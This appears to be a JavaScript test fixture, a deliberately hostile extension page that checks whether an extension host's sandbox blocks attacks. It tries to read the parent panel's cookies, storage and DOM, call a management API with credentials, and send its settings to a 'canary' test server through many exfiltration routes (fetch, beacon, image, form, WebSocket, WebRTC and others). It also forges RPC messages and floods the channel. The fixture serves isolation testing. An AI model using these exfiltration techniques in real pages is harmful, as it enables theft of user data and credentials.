// A hostile extension page (test/hostile), for the browser test: it tries everything an
// extension page must not be able to do, and records what happened in window.__hostile. Its
// manifest declares config.read only. Its settings name where to send stolen data: canary, a
// test server that records every request, and panel, the panel's origin.
//
// Each attack's status: "blocked" (the page saw it fail), "succeeded" (it worked: the test
// fails), or "attempted" (only the canary can tell; the test checks it received nothing).

const results = { done: false, attacks: {}, received: [] };
window.__hostile = results;

const withTimeout = (p, ms, what) =>
  Promise.race([p, new Promise((_, reject) => setTimeout(() => reject(new Error(`${what} timed out`)), ms))]);

async function attempt(name, fn) {
  try {
    const v = await withTimeout(Promise.resolve().then(fn), 3000, name);
    results.attacks[name] = { status: "succeeded", detail: String(JSON.stringify(v) ?? v).slice(0, 300) };
  } catch (e) {
    results.attacks[name] = { status: "blocked", detail: String(e).slice(0, 300) };
  }
}

function fire(name, fn) {
  try {
    fn();
    results.attacks[name] = { status: "attempted", detail: "sent; the canary decides" };
  } catch (e) {
    results.attacks[name] = { status: "blocked", detail: String(e).slice(0, 300) };
  }
}

// Everything the window receives, to show the key never arrives.
window.addEventListener("message", (e) => {
  try {
    results.received.push(JSON.stringify(e.data));
  } catch {
    results.received.push(String(e.data));
  }
});

function hello() {
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => reject(new Error("no welcome")), 5000);
    window.addEventListener("message", function onWelcome(e) {
      if (e.source !== parent || e.data?.pluxy !== "host" || e.ports.length !== 1) return;
      clearTimeout(timer);
      window.removeEventListener("message", onWelcome);
      resolve({ port: e.ports[0], welcome: e.data });
    });
    parent.postMessage({ pluxy: "page", v: 0, type: "hello", versions: [0] }, "*");
  });
}

function rpc(port) {
  let n = 0;
  const pending = new Map();
  port.onmessage = (e) => {
    try {
      results.received.push(JSON.stringify(e.data));
    } catch {
      results.received.push(String(e.data));
    }
    const p = pending.get(e.data?.id);
    if (p) {
      pending.delete(e.data.id);
      p(e.data);
    }
  };
  const raw = (msg, id) =>
    new Promise((resolve) => {
      pending.set(id, resolve);
      port.postMessage(msg);
      setTimeout(() => {
        if (pending.delete(id)) resolve({ error: { code: "no answer" } });
      }, 3000);
    });
  const call = (method, params = null) => {
    const id = `h${++n}`;
    return raw({ v: 0, id, method, params }, id);
  };
  return { call, raw };
}

async function main() {
  const { port, welcome } = await hello();
  const { call, raw } = rpc(port);

  // Allowed: the theme, and its own settings (config.read). The settings say where to aim.
  const theme = await call("theme.get");
  const own = await call("config.get");
  results.allowed = { theme: theme.result?.theme_version === 0, config: own.result?.values ?? null };
  const canary = own.result?.values?.canary;
  const panel = own.result?.values?.panel;
  if (!canary || !panel) throw new Error("settings did not name the canary and the panel");

  // The panel's window, document, storage and cookies.
  await attempt("parentDocument", () => parent.document.body.innerHTML);
  await attempt("topDocument", () => top.document.documentElement.outerHTML);
  await attempt("parentLocalStorage", () => parent.localStorage.getItem("pluxy.key"));
  await attempt("parentSessionStorage", () => parent.sessionStorage.getItem("pluxy.key"));
  await attempt("parentCookies", () => parent.document.cookie);
  await attempt("parentLocation", () => parent.location.href);
  await attempt("opener", () => {
    if (!window.opener) throw new Error("no opener");
    return window.opener.document.cookie;
  });

  // Its own cookies and storage: a sandboxed page has none.
  await attempt("ownCookies", () => document.cookie);
  await attempt("ownLocalStorage", () => {
    localStorage.setItem("x", "1");
    return localStorage.getItem("x");
  });
  await attempt("ownSessionStorage", () => {
    sessionStorage.setItem("x", "1");
    return sessionStorage.getItem("x");
  });
  await attempt(
    "ownIndexedDB",
    () =>
      new Promise((resolve, reject) => {
        const r = indexedDB.open("hostile");
        r.onsuccess = () => resolve("opened");
        r.onerror = () => reject(r.error);
      }),
  );
  await attempt("ownCacheStorage", () => caches.open("hostile").then(() => "opened"));

  // Core's management API, without a key (the page has none) and with the panel's cookies.
  for (const credentials of ["omit", "include"]) {
    await attempt(`managementFetch_${credentials}`, async () => {
      const r = await fetch(`${panel}/v0/management/status`, { credentials });
      if (!r.ok) throw new Error(`HTTP ${r.status}`);
      return r.text();
    });
  }
  await attempt(
    "managementXHR",
    () =>
      new Promise((resolve, reject) => {
        const x = new XMLHttpRequest();
        x.open("GET", `${panel}/v0/management/status`);
        x.withCredentials = true;
        x.onload = () => (x.status === 200 ? resolve(x.responseText) : reject(new Error(`HTTP ${x.status}`)));
        x.onerror = () => reject(new Error("XHR error"));
        x.send();
      }),
  );

  // The panel's navigation, pop-ups and dialogs.
  await attempt("topNavigation", () => {
    top.location.href = `${canary}/top-navigation`;
    return "assigned";
  });
  await attempt("popup", () => {
    const w = window.open(`${canary}/popup`);
    if (!w) throw new Error("no window");
    return "opened";
  });

  // Sending data out, by every route a page has.
  const loot = encodeURIComponent(JSON.stringify(own.result?.values ?? {}));
  await attempt("exfilFetch", async () => (await fetch(`${canary}/fetch?d=${loot}`)).status);
  await attempt("exfilFetchNoCors", async () => {
    await fetch(`${canary}/fetch-no-cors?d=${loot}`, { mode: "no-cors" });
    return "sent";
  });
  await attempt(
    "exfilXHR",
    () =>
      new Promise((resolve, reject) => {
        const x = new XMLHttpRequest();
        x.open("GET", `${canary}/xhr?d=${loot}`);
        x.onload = () => resolve(x.status);
        x.onerror = () => reject(new Error("XHR error"));
        x.send();
      }),
  );
  await attempt(
    "exfilWebSocket",
    () =>
      new Promise((resolve, reject) => {
        const ws = new WebSocket(`${canary.replace(/^http/, "ws")}/ws?d=${loot}`);
        ws.onopen = () => resolve("open");
        ws.onerror = () => reject(new Error("WebSocket error"));
      }),
  );
  await attempt(
    "exfilEventSource",
    () =>
      new Promise((resolve, reject) => {
        const es = new EventSource(`${canary}/sse?d=${loot}`);
        es.onopen = () => resolve("open");
        es.onerror = () => {
          es.close();
          reject(new Error("EventSource error"));
        };
      }),
  );
  await attempt("exfilImport", () => import(`${canary}/import.js?d=${loot}`));
  await attempt(
    "exfilWorker",
    () =>
      new Promise((resolve, reject) => {
        const w = new Worker(`${canary}/worker.js?d=${loot}`);
        w.onerror = () => reject(new Error("worker error"));
        setTimeout(() => resolve("started"), 500);
      }),
  );
  await attempt("exfilFont", () => new FontFace("x", `url(${canary}/font?d=${loot})`).load());
  fire("exfilBeacon", () => {
    if (!navigator.sendBeacon(`${canary}/beacon`, loot)) throw new Error("beacon refused");
  });
  fire("exfilImage", () => {
    new Image().src = `${canary}/image?d=${loot}`;
  });
  fire("exfilStylesheet", () => {
    const l = document.createElement("link");
    l.rel = "stylesheet";
    l.href = `${canary}/style.css?d=${loot}`;
    document.head.append(l);
  });
  fire("exfilPrefetch", () => {
    const l = document.createElement("link");
    l.rel = "prefetch";
    l.href = `${canary}/prefetch?d=${loot}`;
    document.head.append(l);
  });
  fire("exfilCssUrl", () => {
    document.body.style.backgroundImage = `url(${canary}/css-url?d=${loot})`;
  });
  fire("exfilFrame", () => {
    const f = document.createElement("iframe");
    f.src = `${canary}/frame?d=${loot}`;
    document.body.append(f);
  });
  fire("exfilForm", () => {
    const f = document.createElement("form");
    f.method = "POST";
    f.action = `${canary}/form`;
    const i = document.createElement("input");
    i.name = "d";
    i.value = loot;
    f.append(i);
    document.body.append(f);
    f.submit();
  });
  fire("exfilAudio", () => {
    const a = new Audio(`${canary}/audio?d=${loot}`);
    a.play().catch(() => {});
  });

  // The channel: methods it may not call, other extensions, bad messages, floods.
  const forbidden = await call("config.set", { values: { canary: "changed by the hostile page" } });
  results.attacks.configSetWithoutPermission = verdict(forbidden, "forbidden");
  const unknown = await call("management.call", { method: "GET", path: "/status" });
  results.attacks.unknownMethod = verdict(unknown, "unknown_method");
  const key = await call("key.get");
  results.attacks.keyMethod = verdict(key, "unknown_method");
  const foreign = await call("config.get", { extension: "test/alpha" });
  results.attacks.otherExtensionConfig = verdict(foreign, "bad_request");
  const extraKey = await raw({ v: 0, id: "extra", method: "theme.get", params: null, extension: "test/alpha" }, "extra");
  results.attacks.extraField = verdict(extraKey, "bad_request");
  const wrongVersion = await raw({ v: 1, id: "v1", method: "theme.get", params: null }, "v1");
  results.attacks.wrongVersion = verdict(wrongVersion, "bad_request");
  const big = await raw({ v: 0, id: "big", method: "theme.get", params: { junk: "x".repeat(70000) } }, "big");
  results.attacks.oversized = verdict(big, "too_large");

  // A second hello must not give a second channel.
  const second = await withTimeout(hello(), 1500, "second hello").then(
    () => ({ status: "succeeded", detail: "second channel" }),
    (e) => ({ status: "blocked", detail: String(e) }),
  );
  results.attacks.secondHello = second;

  // Calls sent to the panel's window instead of the channel are ignored.
  parent.postMessage({ v: 0, id: "forged", method: "config.get", params: null }, "*");
  parent.postMessage({ pluxy: "page", v: 0, type: "call", method: "key.get" }, "*");

  const flood = await Promise.all(Array.from({ length: 100 }, () => call("theme.get")));
  const limited = flood.filter((r) => r.error?.code === "rate_limited").length;
  results.attacks.flood = {
    status: limited > 0 ? "blocked" : "succeeded",
    detail: `${flood.length - limited} answered, ${limited} rate limited`,
  };

  // WebRTC is outside Content Security Policy; recorded, not counted (see the README).
  try {
    const pc = new RTCPeerConnection({ iceServers: [{ urls: `stun:${new URL(canary).host}` }] });
    pc.createDataChannel(loot.slice(0, 50));
    await pc.setLocalDescription(await pc.createOffer());
    results.webrtc = "offer made";
  } catch (e) {
    results.webrtc = String(e).slice(0, 200);
  }

  results.welcomeKeys = Object.keys(welcome).sort();
}

function verdict(reply, code) {
  if (reply?.error?.code === code) return { status: "blocked", detail: code };
  return { status: "succeeded", detail: JSON.stringify(reply).slice(0, 300) };
}

main()
  .catch((e) => {
    results.error = String(e);
  })
  .finally(() => {
    results.done = true;
    document.getElementById("state").textContent = "done";
  });
